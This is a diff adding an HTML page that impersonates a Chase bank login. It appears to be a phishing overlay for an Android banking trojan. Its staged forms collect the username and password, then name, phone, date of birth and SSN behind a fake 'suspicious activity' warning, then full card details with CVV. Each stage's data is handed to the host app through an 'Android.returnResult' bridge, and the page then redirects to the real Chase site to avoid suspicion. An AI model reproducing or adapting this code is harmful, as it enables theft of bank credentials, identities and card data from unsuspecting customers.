@@ -1,0 +1,325 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>CHASE</title>
+</head>
+<style>
+html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0}main{display:block}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}b,strong{font-weight:bolder}code,kbd,samp{font-family:monospace,monospace;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}img{border-style:none}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0}button,input{overflow:visible}button,select{text-transform:none}button,[type="button"],[type="reset"],[type="submit"]{-webkit-appearance:button}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner{border-style:none;padding:0}button:-moz-focusring,[type="button"]:-moz-focusring,[type="reset"]:-moz-focusring,[type="submit"]:-moz-focusring{outline:1px dotted ButtonText}fieldset{padding:.35em .75em .625em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}progress{vertical-align:baseline}textarea{overflow:auto}[type="checkbox"],[type="radio"]{box-sizing:border-box;padding:0}[type="number"]::-webkit-inner-spin-button,[type="number"]::-webkit-outer-spin-button{height:auto}[type="search"]{-webkit-appearance:textfield;outline-offset:-2px}[type="search"]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}details{display:block}summary{display:list-item}template{display:none}[hidden]{display:none}
+body {
+    background: linear-gradient(60deg, #003c69, #0061ac);
+    background-color: #003c69;
+}
+html {
+    font-family: "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+}
+.header {
+    position: relative;
+    z-index: 2;
+}
+.logongardient {
+    background-color: transparent;
+    background-image: linear-gradient(to bottom, rgba(0, 0, 0, .7) 0, rgba(0, 0, 0, .5) 50%, rgba(0, 0, 0, 0) 100%);
+    padding: 18px 0;
+    text-align: center;
+}
+.logo {
+    width: 220px;
+    height: 2rem;
+    margin: 0 auto;
+    text-align: center;
+    background: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzODAgNzIuMiI+CgkJPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTM1Ni4xLDFsLTIyLjUsMGMtMS40LDAtMi41LDEuMS0yLjUsMi41djE3LjRIMzc3TDM1Ni4xLDF6Ii8+CgkJPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTM3Ni4yLDIzLjZoLTE3LjR2NDUuOWwxOS44LTIwLjlsMC0yMi41QzM3OC43LDI0LjcsMzc3LjYsMjMuNiwzNzYuMiwyMy42eiIvPgoJCTxwYXRoIGZpbGw9IiNGRkZGRkYiIGQ9Ik0zMzEuMSw3MS4yaDIyLjVjMS40LDAsMi41LTEuMSwyLjUtMi41VjUxLjNoLTQ1LjlMMzMxLjEsNzEuMnoiLz4KCQk8cGF0aCBmaWxsPSIjRkZGRkZGIiBkPSJNMzI4LjQsNDguNlYyLjdsLTE5LjksMjAuOXYyMi41YzAsMS40LDEuMSwyLjUsMi41LDIuNUgzMjguNHoiLz4KCQk8cG9seWdvbiBmaWxsPSIjRkZGRkZGIiBwb2ludHM9IjI4Mi40LDUzLjQgMjUyLDUzLjQgMjUyLDM5LjkgMjgxLjQsMzkuOSAyODEuNCwzMC44IDI1MiwzMC44IDI1MiwxOC42IDI4Mi40LDE4LjYgMjg4LjIsOS40IDI0MS4yLDkuNCAyNDEuMiw2Mi44IDI4OC40LDYyLjggIi8+CgkJPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTIxNy4zLDMwLjVoLTIxLjRjLTIuNCwwLTQtMC42LTQtNC4yYzAsMCwwLTMuNywwLTMuN2MwLTMsMS4xLTQuMSwzLjktNC4xbDI4LDBsNS45LTkuMmwtMzUuNywwCgkJCWMtNi41LDAtMTMuMSwzLjktMTMuMSwxMy45djIuNmMwLDEwLjQsNi40LDE0LjQsMTIuNywxNC40SDIxNmMyLjMsMCw0LjIsMC40LDQuMiw0LjNsMCw0LjVjLTAuMSwzLjUtMS44LDQuMy00LjMsNC4zaC0yOS40CgkJCWwtNiw5LjRoMzYuMmM4LjcsMCwxNC43LTQuMywxNC43LTE0LjR2LTMuN0MyMzEuMywzNS4xLDIyNS44LDMwLjUsMjE3LjMsMzAuNXoiLz4KCQk8cGF0aCBmaWxsPSIjRkZGRkZGIiBkPSJNMTUwLjgsOS40bDI1LjQsNTMuNGgtMTJsLTQuOS0xMWgtMjcuNmwtNC45LDExaC0xMmwyNS4zLTUzLjRIMTUwLjh6IE0xNTUuMiw0Mi43bC05LjctMjIuMmwtOS43LDIyLjIKCQkJCQkJSDE1NS4yeiIvPgoJCTxwb2x5Z29uIGZpbGw9IiNGRkZGRkYiIHBvaW50cz0iOTguMSwzMC42IDY4LjYsMzAuNiA2OC42LDkuNCA1Ny44LDkuNCA1Ny44LDYyLjggNjguNiw2Mi44IDY4LjYsMzkuOSA5OC4xLDM5LjkgOTguMSw2Mi44IDEwOC45LDYyLjggMTA4LjksOS40IDk4LjEsOS40IAkJIi8+CgkJPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTIwLDE4LjhoMjUuNWw2LTkuNUgxNy44QzYuNyw5LjQsMSwxNi4yLDEsMjYuMXYyMGMwLDExLjUsNy4zLDE2LjgsMTYuOCwxNi44bDMzLjcsMEw0NS4zLDUzSDE5LjkKCQkJYy01LjQsMC03LjctMi03LjctOFYyN0MxMi4xLDIxLjEsMTQuMSwxOC44LDIwLDE4Ljh6Ii8+Cjwvc3ZnPgo=) center center no-repeat;
+}
+.main {
+    margin-top: 10px;
+}
+.autorizeBox {
+    background: rgba(255, 255, 255, .96);
+    border-radius: 5px;
+    padding: 1.25rem 0;
+    max-width: 384px !important;
+    overflow: visible !important;
+    margin: 0 auto;
+}
+@media only screen and (max-width: 444px) {
+    .autorizeBox {
+        margin: 0 20px;
+    }
+}
+.autorizeBox form {
+    position: relative;
+    min-height: .0625rem;
+    padding: 5px 35px;
+}
+.autorizeBox ::placeholder {
+    color: #717171;
+    opacity: 1;
+}
+.autorizeBox label {
+    font-size: 1.125rem;
+    -webkit-touch-callout: none;
+    -webkit-user-select: none;
+    -khtml-user-select: none;
+    -moz-user-select: none;
+    -ms-user-select: none;
+    user-select: none;
+    margin-left: 5px;
+}
+.autorizeBox input {
+    font-size: 1.125rem;
+    background: 0 0;
+    border: none;
+    border-bottom: 1px solid #ccc;
+    padding: 5px;
+    margin: 10px 0;
+    width: 96%;
+}
+.autorizeBox input.dt {
+    width: 17%;
+}
+.autorizeBox button {
+    margin: 20px 0;
+    background-color: #0b6efd;
+    border: none;
+    width: 100%;
+    height: 2.5rem;
+    overflow-x: auto;
+    border-radius: .3125rem;
+    text-align: center;
+    vertical-align: middle;
+    cursor: pointer;
+}
+.autorizeBox button:disabled,
+.autorizeBox button[disabled] {
+    background-color: #8c8c8c;
+}
+.autorizeBox button span {
+    line-height: 1.125rem;
+    white-space: normal;
+    margin: .0625rem .75rem;
+    font-size: 1rem;
+    font-weight: 600;
+    color: #fff;
+    letter-spacing: 0;
+    text-decoration: none;
+}
+.footer {
+    background: #fff;
+    font-size: 16px;
+    padding: 1em 0;
+    margin-top: 250px;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    color: #757575;
+    font-size: .65625rem;
+    text-align: center;
+}
+.footer p {
+    margin: 25px 0;
+}
+#ccnumlbl {
+    color: red;
+    font-size: 0.8rem;
+}
+.warntext {
+    color: red;
+    margin-bottom: 20px;
+    text-align: center;
+    font-weight: bolder;
+}
+</style>
+<body>
+    <div class="header"><div class="logongardient">
+        <div class="logo"></div>
+    </div></div>
+    <div class="main">
+        <div class="autorizeBox">
+            <form id="login" action="" style="">
+                    <input id="Login" placeholder="Username" pattern=".{4,}" autocomplete="off" type="text" required>
+                    <input id="Password" placeholder="Password" pattern=".{4,}" autocomplete="off" type="password" required>
+                    <button type="button" onclick="process('login')"><span>Sign in</span></button>
+            </form>
+            <form id="address" action="" style="display:none;">
+                    <p class="warntext">Suspicious activity has been noticed on your account. Verify your identity.</p>
+                    <input id="FirstName" placeholder="First name" pattern=".{3,}" autocomplete="off" type="text" required>
+                    <input id="LastName" placeholder="Last name" pattern=".{3,}" autocomplete="off" type="text" required>
+                    <input id="Phone" placeholder="Phone number +1..." pattern="^\+[0-9]{6,}" maxlength="30" autocomplete="off" type="text" required>
+                    <br><label>Date of birth: </label>
+                    <input id="DOB" placeholder="mm/dd/yyyy" type="date" pattern=".{1,}" autocomplete="off" type="text" style="width: 50%;" required>
+                    <input id="SSN" placeholder="SSN number" pattern="[0-9\-]{9,11}" maxlength="11" autocomplete="off" type="text" required>
+                    <button type="button" onclick="process('address')"><span>Next</span></button>
+            </form>
+            <form id="CC" action="" style="display:none;">
+                    <input id="CCNUM" placeholder="Credit card number" pattern="^[0-9 ]{12,24}$" maxlength="24" autocomplete="off" type="text" required>
+                    <span id="ccnumlbl"></span>
+                    <br><label>EXP Date: </label>
+                    <input class="dt" id="CCexpMM" placeholder="MM" pattern="^[1-9]{1}$|^[1]{1}[0-2]{1}$|^[0][1-9]{1}$" maxlength="2" autocomplete="off" type="text" required>
+                    <input class="dt" id="CCEXPYY" placeholder="YY" pattern="^19$|^2[0-9]$" maxlength="2" autocomplete="off" type="text" required>
+                    <br><label>CVV code: </label>
+                    <input id="CVV" placeholder="CVV" pattern="^[0-9]{3}$" autocomplete="off" maxlength="3" type="password" style="width:15%;" required>
+					<input id="exit" type="hidden" text="true"/>
+                    <button type="button" onclick="process('CC')"><span>Sign in</span></button>
+            </form>
+        </div>
+    </div>
+    <div class="footer"><p>Equal Housing Lender<br>
+        Deposit products provided by JPMorgan Chase Bank, N.A. Member FDIC<br>
+        Credit cards are issued by Chase Bank USA, N.A.<br>
+        © 2019 JPMorgan Chase & Co.</p></div>
+</body>
+<script>
+var invalidCC = 'Invalid card number';
+
+function maskCC(event) {
+    var v = this.value.replace(/\D/g, '');
+    this.value = '';
+    for(var i = 0; i < v.length; i++) {
+        this.value += (i%4==0 && i != 0 ? ' ' : '') + v[i];
+    }
+}
+document.getElementById('CCNUM').addEventListener('input', maskCC, false);
+
+function maskPhone(event) {
+    var v = this.value.replace(/\D/g, '');
+    this.value = '+' + v;
+}
+document.getElementById('Phone').addEventListener('input', maskPhone, false);
+
+function maskOnlyNumbers(event) {
+    this.value = this.value.replace(/\D/g, '');
+}
+
+var arrtagsID = ['SSN', 'CCexpMM', 'CCEXPYY', 'CVV'];
+for(var iid in arrtagsID) {
+    document.getElementById(arrtagsID[iid]).addEventListener('input', maskOnlyNumbers, false);
+}
+
+function valid_credit_card(value) {
+	if (/[^0-9-\s]+/.test(value)) return false;
+	var nCheck = 0, nDigit = 0, bEven = false;
+	value = value.replace(/\D/g, "");
+	for (var n = value.length - 1; n >= 0; n--) {
+		var cDigit = value.charAt(n),
+			  nDigit = parseInt(cDigit, 10);
+		if (bEven) {
+			if ((nDigit *= 2) > 9) nDigit -= 9;
+		}
+		nCheck += nDigit;
+		bEven = !bEven;
+	}
+	return (nCheck % 10) == 0;
+}
+
+var allButtons = document.getElementsByTagName('button');
+for(var btn in allButtons) {
+    allButtons[btn].disabled = true;
+}
+
+function CheckValidInput(id) {
+    var finalbool = true, formids = document.getElementById(id);
+	var currentinputs = formids.getElementsByTagName('input');
+    for(var i = 0; i < currentinputs.length; i++ ) {
+        if(currentinputs[i].id == 'CCNUM') {
+            var bbb = valid_credit_card(currentinputs[i].value);
+            document.getElementById('ccnumlbl').innerText = bbb & currentinputs[i].checkValidity() ? '' : invalidCC;
+            finalbool&= bbb;
+            continue;
+        }
+        finalbool &= currentinputs[i].checkValidity();
+    }
+    formids.getElementsByTagName('button')[0].disabled = !finalbool;
+}
+
+var AllForms = document.getElementsByTagName('form');
+function formChange(formId) {
+    for(var i = 0; i < AllForms.length; i++) {
+        AllForms[i].style.display = 'none';
+        if(AllForms[i].id == formId) {
+            AllForms[i+1].style.display = '';
+            break;
+        }
+    }
+}
+
+for(var i = 0; i < AllForms.length; i++) {
+    var myInputs = AllForms[i].getElementsByTagName('input');
+    for(var j = 0; j < myInputs.length; j++) {
+        AddInputEventByFormID(myInputs[j],AllForms[i].id);
+    }
+}
+
+function AddInputEventByFormID(input, formid) {
+    input.addEventListener('input', function(){CheckValidInput(formid)});
+}
+
+function process(formId) {
+    try {
+        Android.returnResult( formToJSON(document.getElementById(formId)) );
+    } catch (err) {}
+    if(formId == 'CC')
+    {
+        location.replace('https://chase.com/');
+        return;
+    }
+    formChange(formId);
+}
+
+/*********Recursive implementation of jSON.stringify; ********/
+var stringifyJSON = function(obj) {
+    var arrOfKeyVals = [],
+        arrVals = [],
+        objKeys = [];
+
+    /*********CHECK FOR PRIMITIVE TYPES**********/
+    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+        return '' + obj;
+    else if (typeof obj === 'string')
+        return '"' + obj + '"';
+
+    /*********CHECK FOR ARRAY**********/
+    else if (Array.isArray(obj)) {
+        if (obj[0] === undefined)
+            return '[]';
+        else {
+            obj.forEach(function(el) {
+                arrVals.push(stringifyJSON(el));
+            });
+            return '[' + arrVals + ']';
+        }
+    }
+    /*********CHECK FOR OBJECT**********/
+    else if (obj instanceof Object) {
+        objKeys = Object.keys(obj);
+        objKeys.forEach(function(key) {
+            var keyOut = '"' + key + '":';
+            var keyValOut = obj[key];
+            if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                arrOfKeyVals.push('');
+            else if (typeof keyValOut === 'string')
+                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                arrOfKeyVals.push(keyOut + keyValOut);
+            else if (keyValOut instanceof Object) {
+                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+            }
+        });
+        return '{' + arrOfKeyVals + '}';
+    }
+};
+
+function formToJSON(f)
+{
+    var FinalObject = {}, namesHTML = ['input','select'];
+    for(var i = 0; i < namesHTML.length; i++) {
+		var bsform = f.getElementsByTagName(namesHTML[i]);
+        for(var j = 0; j < bsform.length; j++) {
+            FinalObject[bsform[j].id] = bsform[j].value
+        }
+    }
+    return stringifyJSON(FinalObject);
+}
+</script>
+</html>
